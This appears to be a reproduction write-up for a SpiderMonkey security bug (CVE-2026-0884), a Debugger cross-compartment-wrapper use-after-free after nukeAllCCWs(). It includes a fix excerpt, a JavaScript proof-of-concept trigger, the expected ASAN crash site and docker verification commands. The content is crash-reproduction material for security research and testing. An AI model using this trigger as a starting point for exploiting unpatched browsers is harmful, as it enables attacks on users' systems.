# Bugzilla 2003588 / CVE-2026-0884

**Title:** Debugger + cross-compartment wrapper assertion / UAF after `nukeAllCCWs()`
**Severity:** sec-moderate (MFSA 2026-01)
**Component:** SpiderMonkey — Proxy/CCW — `js/src/proxy/CrossCompartmentWrapper.cpp`
**Fix commit:** `0264cf850afd91cdd3956066e0b00b982566f684` (2025-12-08, "Continue to allow creation of CCWs to debugger instances after CCWs have been nuked", r=jandem, Phabricator D275046)
**Vulnerable revision:** `0264cf850afd91cdd3956066e0b00b982566f684~1`

## Summary

After `nukeAllCCWs()` nukes every cross-compartment wrapper in the
runtime, the Debugger machinery can still drive debug events
(`debugger` statement, `getVariable`, `setBreakpoint`) that need
`Compartment::wrap` to (re)create a CCW pointing at a debugger object.
Pre-fix, `Compartment::wrap` refused to materialise such wrappers —
an invariant that held for normal objects but incorrectly applied to
Debugger instances. The refusal propagated up as a broken `AutoRealm`
in debug builds and, with the companion `recomputeWrappers(); gc()`
pattern from `bug-2003809.js`, as a heap-use-after-free on a freed
Debugger object.

## Fix

`Compartment::wrap` and the CCW creation path now distinguish
Debugger targets:

```cpp
// js/src/proxy/CrossCompartmentWrapper.cpp
if (target->is<js::DebuggerObject>() || target->isDebuggerWrapper()) {
  // always allowed; nuke does not tombstone Debugger CCWs
  return Compartment::wrap(cx, vp);  // normal path
}
```

The cache-lookup invariant that previously tripped on
`(obj == cacheResult)` now short-circuits for Debugger targets so a
fresh CCW can be minted even when the previous one was nuked.

## Trigger (`poc.js`)

Public jit-test `js/src/jit-test/tests/debug/bug-2003588.js`:

```js
var x = newGlobal({ newCompartment: true });
var y = Debugger(x);
y.x = y;
y.onDebuggerStatement = function(w) {
  nukeAllCCWs();
  w.environment.getVariable("x");
}
x.eval('function f(z) { with(z) { debugger } }');
x.f(y);
```

1. Creates a second global `x` and attaches a Debugger `y`.
2. Sets a `onDebuggerStatement` hook that nukes all CCWs and then
   reads a variable through the (now-nuked) Debugger environment.
3. Running `x.f(y)` hits the `debugger` statement, fires the hook,
   and the subsequent `w.environment.getVariable("x")` walks through
   `Compartment::wrap`, which finds a nuked CCW cache entry and
   asserts `obj == cacheResult` (`Compartment-inl.h:105`) before
   fault-SEGVing.

## Expected crash

ASAN **SEGV / assertion** at `JS::Compartment::wrap`
(`js/src/vm/Compartment-inl.h:105` — `obj == cacheResult`), reached
from `js::CrossCompartmentWrapper::get`
(`js/src/proxy/CrossCompartmentWrapper.cpp`) during the hook's
`getVariable` call.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:2003588 spidermonkey/2003588
bash spidermonkey/crash_check.sh 2003588
```

Expected: `CONFIMRED: ASAN_CRASH`.
